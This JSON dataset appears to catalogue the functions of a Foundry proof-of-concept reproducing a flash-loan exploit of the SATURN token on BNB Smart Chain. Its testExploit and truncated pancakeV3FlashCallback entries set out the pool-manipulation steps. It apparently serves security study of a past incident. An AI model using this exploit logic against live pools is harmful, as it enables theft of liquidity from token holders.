[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "SATURN_creater",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "approveAll",
    "original_code": "    function approveAll() public {\n        SATURN.approve(address(router), type(uint256).max);\n        WBNB.approve(address(router), type(uint256).max);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "attacker",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        // Get the everyTimeSellLimitAmount from the SATURN contract\n        uint256 limit = getEveryTimeSellLimitAmount();\n\n        // Get the current balance of SATURN in the pair_WBNB_SATURN pool\n        uint256 amount = SATURN.balanceOf(address(pair_WBNB_SATURN));\n\n        // Define the swap paths\n        address[] memory buyPath = getPath(address(WBNB), address(SATURN));\n        address[] memory sellPath = getPath(address(SATURN), address(WBNB));\n\n        // Calculate the amount of WBNB needed to swap for SATURN\n        uint256[] memory amounts = router.getAmountsIn(amount - limit, buyPath);\n\n        // Swap WBNB for SATURN and send the SATURN to the SATURN_creater\n        swapExactTokensForTokens(amounts[0], buyPath);\n\n        // Update the amount of SATURN in the pair_WBNB_SATURN pool\n        amount = SATURN.balanceOf(address(pair_WBNB_SATURN));\n\n        // Move the block number forward by 1\n        vm.roll(block.number + 1);\n\n        // Transfer a specific amount of SATURN to the pair_WBNB_SATURN pool\n        SATURN.transfer(address(pair_WBNB_SATURN), finalSaturnSellAmt);\n\n        // Get the current reserves of SATURN and WBNB in the pair_WBNB_SATURN pool\n        (uint256 SATURN_reserve, uint256 WBNB_reserve,) = pair_WBNB_SATURN.getReserves();\n\n        // Update the amount of SATURN in the pair_WBNB_SATURN pool\n        amount = SATURN.balanceOf(address(pair_WBNB_SATURN));\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 38_488_209 - 1);\n        vm.label(address(SATURN), \"SATURN\");\n        vm.label(address(WBNB), \"WBNB\");\n        vm.label(address(router), \"PancakeSwap Router\");\n        vm.label(address(pair_WBNB_SATURN), \"pair_WBNB_SATURN\");\n        vm.label(address(pancakeV3Pool), \"pancakeV3Pool\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public balanceLog {\n        approveAll();\n        // init saturn token\n\n        EnableSwitch(false);\n\n        vm.startPrank(holderOfToken);\n        SATURN.transfer(attacker, SATURN.balanceOf(holderOfToken));\n        vm.stopPrank();\n\n        EnableSwitch(true);\n\n        // start attack\n        pancakeV3Pool.flash(attacker, 0, flashAmt, bytes(\"\"));\n    }\n\n",
    "description": ""
  }
]